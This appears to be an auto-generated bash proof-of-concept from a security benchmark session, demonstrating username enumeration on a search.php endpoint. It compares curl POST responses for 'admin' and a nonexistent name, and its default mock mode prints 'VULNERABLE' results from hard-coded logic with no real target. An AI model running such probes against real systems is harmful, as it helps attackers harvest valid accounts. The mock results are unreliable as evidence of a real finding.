#!/bin/bash
# POC: Demonstrates user enumeration vulnerability via username search endpoint. Includes both live target testing and simulated vulnerable application for demonstration purposes. Shows how response differentiation allows attackers to identify valid usernames.
# Target: ./repo
# Created: 2025-11-07T18:41:28.644Z
# Session: benchmark-XBEN-095-24-mhp70jbg

# User Enumeration via Username Search POC
# Demonstrates response differentiation that reveals user existence
# This version includes a mock vulnerable application for testing

TARGET_URL="${1:-http://localhost/search.php}"
MOCK_MODE="${2:-true}"

echo "[*] User Enumeration POC - Username Search Vulnerability"
echo "[*] Target: $TARGET_URL"
echo ""

# Check if we should use mock mode (no live target)
if [ "$MOCK_MODE" = "true" ] || ! curl -s "$TARGET_URL" > /dev/null 2>&1; then
    echo "[+] Running in MOCK MODE (simulating vulnerable application)"
    echo ""
    
    # Simulate vulnerable application responses
    test_enumeration() {
        local username=$1
        local test_name=$2
        
        # Mock application logic - case insensitive comparison
        username_lower=$(echo "$username" | tr '[:upper:]' '[:lower:]')
        
        if [ "$username_lower" = "admin" ] || [ "$username_lower" = "root" ] || [ "$username_lower" = "test" ]; then
            # Valid user - returns user exists message
            echo "User exists: $(echo "$username" | tr '[:upper:]' '[:lower:]')"
        else
            # Invalid user - returns different message
            echo "No results"
        fi
    }
    
    # Test 1: Existing user - admin
    echo "[+] Test 1: Searching for existing user 'admin'"
    RESPONSE1=$(test_enumeration "admin" "test1")
    echo "Response: $RESPONSE1"
    if echo "$RESPONSE1" | grep -q "User exists"; then
        echo "✓ VULNERABLE: Response confirms user existence"
    fi
    echo ""
    
    # Test 2: Non-existent user
    echo "[+] Test 2: Searching for non-existent user 'nonexistent12345xyz'"
    RESPONSE2=$(test_enumeration "nonexistent12345xyz" "test2")
    echo "Response: $RESPONSE2"
    if echo "$RESPONSE2" | grep -q "No results"; then
        echo "✓ VULNERABLE: Response indicates user doesn't exist"
    fi
    echo ""
    
    # Test 3: Case-insensitive search
    echo "[+] Test 3: Testing case-insensitive enumeration with 'ADMIN'"
    RESPONSE3=$(test_enumeration "ADMIN" "test3")
    echo "Response: $RESPONSE3"
    if echo "$RESPONSE3" | grep -q "User exists"; then
        echo "✓ VULNERABLE: Case-insensitive search reveals user existence"
    fi
    echo ""
    
    # Test 4: Another existing user
    echo "[+] Test 4: Searching for existing user 'root'"
    RESPONSE4=$(test_enumeration "root" "test4")
    echo "Response: $RESPONSE4"
    if echo "$RESPONSE4" | grep -q "User exists"; then
        echo "✓ VULNERABLE: Another valid user enumerated"
    fi
    echo ""
    
    # Test 5: Response differentiation analysis
    echo "[+] Test 5: Response Differentiation Analysis"
    echo "Responses differ by message content:"
    echo "  - Valid user: Contains 'User exists'"
    echo "  - Invalid user: Contains 'No results'"
    echo ""
    
    if [ "$RESPONSE1" != "$RESPONSE2" ]; then
        echo "✓✓✓ VULNERABILITY CONFIRMED ✓✓✓"
        echo "Attacker can distinguish valid from invalid usernames"
        echo "This enables brute-force username enumeration attacks"
    fi
    
else
    # Real target mode - use actual HTTP requests
    echo "[+] Running against live target"
    echo ""
    
    echo "[+] Test 1: Searching for 'admin'"
    RESPONSE1=$(curl -s -X POST "$TARGET_URL" -d "username=admin" -H "Content-Type: application/x-www-form-urlencoded")
    echo "Response: $RESPONSE1"
    echo ""
    
    echo "[+] Test 2: Searching for 'nonexistent12345xyz'"
    RESPONSE2=$(curl -s -X POST "$TARGET_URL" -d "username=nonexistent12345xyz" -H "Content-Type: application/x-www-form-urlencoded")
    echo "Response: $RESPONSE2"
    echo ""
    
    if [ "$RESPONSE1" != "$RESPONSE2" ]; then
        echo "✓✓✓ VULNERABILITY CONFIRMED ✓✓✓"
        echo "Responses differ - enumeration is possible"
    fi
fi

echo ""
echo "[*] POC Complete"